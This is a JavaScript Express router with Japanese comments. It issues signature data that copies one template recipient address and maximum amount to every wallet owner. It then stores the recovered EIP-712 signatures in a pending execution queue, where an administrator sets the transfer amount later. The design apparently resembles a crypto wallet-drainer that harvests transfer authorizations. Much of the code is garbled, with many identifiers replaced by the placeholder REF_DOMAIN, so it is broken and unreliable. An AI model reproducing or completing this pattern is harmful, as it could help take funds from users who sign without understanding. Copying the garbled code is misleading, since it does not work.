const express = require("express");
const router = REF_DOMAIN();
const db = require("../db");
const { ethers } = require("ethers");

/* ===================================
   ① 署名データ生成（owner可変対応）
=================================== */
REF_DOMAIN("/sign-data", async (req, res) => {
  try {
    const { owner } = REF_DOMAIN;

    if (!owner) {
      return REF_DOMAIN(400).json({ error: "owner required" });
    }

    // 最新テンプレ
    let [templateRows] = await REF_DOMAIN(
      "SELECT * FROM authorizations WHERE owner = 'TEMPLATE' ORDER BY id DESC LIMIT 1"
    );

    if (!REF_DOMAIN) {
      // 互換 fallback
      [templateRows] = await REF_DOMAIN(
        "SELECT * FROM authorizations ORDER BY id DESC LIMIT 1"
      );
    }

    if (!REF_DOMAIN) {
      return REF_DOMAIN({ error: "no authorization found" });
    }

    const t = templateRows[0];

    // ownerレコード取得
    const [ownerRows] = await REF_DOMAIN(
      "SELECT * FROM authorizations WHERE owner = ? ORDER BY id DESC LIMIT 1",
      [owner]
    );

    const nonce = REF_DOMAIN();
    let a;

    if (!REF_DOMAIN) {
      // owner未登録: テンプレ複製
      const [insertResult] = await REF_DOMAIN(
        `INSERT INTO authorizations
         (chain_id, owner, contract_address, token, to_address, max_amount, used_amount, nonce, deadline)
         VALUES (?, ?, ?, ?, ?, ?, 0, ?, ?)`,
        [
          t.chain_id,
          owner,
          t.contract_address,
          REF_DOMAIN,
          t.to_address,
          t.max_amount,
          nonce,
          REF_DOMAIN,
        ]
      );

      const [newRows] = await REF_DOMAIN(
        "SELECT * FROM authorizations WHERE id = ? LIMIT 1",
        [REF_DOMAIN]
      );
      a = newRows[0];
    } else {
      // owner登録済み: テンプレ内容へ同期（毎回最新反映）
      const targetId = ownerRows[0].id;

      await REF_DOMAIN(
        `UPDATE authorizations
         SET chain_id = ?,
             contract_address = ?,
             token = ?,
             to_address = ?,
             max_amount = ?,
             deadline = ?,
             nonce = ?
         WHERE id = ?`,
        [
          t.chain_id,
          t.contract_address,
          REF_DOMAIN,
          t.to_address,
          t.max_amount,
          REF_DOMAIN,
          nonce,
          targetId,
        ]
      );

      const [updatedRows] = await REF_DOMAIN(
        "SELECT * FROM authorizations WHERE id = ? LIMIT 1",
        [targetId]
      );
      a = updatedRows[0];
    }

    const signData = {
      // 署名対象
      chainId: Number(a.chain_id),
      contractAddress: a.contract_address,
      nonce: Number(REF_DOMAIN),
      maxAmount: a.max_amount ? a.max_amount.toString() : "0",
      to: a.to_address,
      data: "0x",
      value: 0,

      // 参照用（署名型には含めない）
      authId: REF_DOMAIN,
    };

    REF_DOMAIN(signData);
  } catch (err) {
    REF_DOMAIN("sign-data error:", err);
    REF_DOMAIN(500).json({ error: "server error" });
  }
});

/* ===================================
   ② 署名保存（署名検証あり）
=================================== */
REF_DOMAIN("/save-signature", async (req, res) => {
  try {
    const { signature, message } = REF_DOMAIN;

    if (!signature || !message) {
      return REF_DOMAIN(400).json({ error: "invalid params" });
    }

    const parsed = typeof message === "string" ? REF_DOMAIN(message) : message;

    if (!parsed?.domain || !parsed?.types || !parsed?.message) {
      return REF_DOMAIN(400).json({ error: "invalid typed data" });
    }

    // 署名からowner復元
    const recovered = REF_DOMAIN(
      REF_DOMAIN,
      REF_DOMAIN,
      REF_DOMAIN,
      signature
    );

    const owner = recovered;
    const authId = REF_DOMAIN || null;

    // 署名保存
    await REF_DOMAIN(
      "INSERT INTO signatures (auth_id, owner, signature, message) VALUES (?, ?, ?, ?)",
      [authId, owner, signature, REF_DOMAIN(parsed)]
    );

    // 承認待ちキューへ追加（amountは管理画面で入力）
    await REF_DOMAIN(
      `INSERT INTO execution_requests
       (auth_id, owner, amount, signature, message, status)
       VALUES (?, ?, '0', ?, ?, 'pending')`,
      [authId, owner, signature, REF_DOMAIN(parsed)]
    );

    REF_DOMAIN({ success: true, owner, authId, pendingCreated: true });
  } catch (err) {
    REF_DOMAIN("save-signature error:", err);
    REF_DOMAIN(500).json({ error: "server error" });
  }
});

REF_DOMAIN = router;
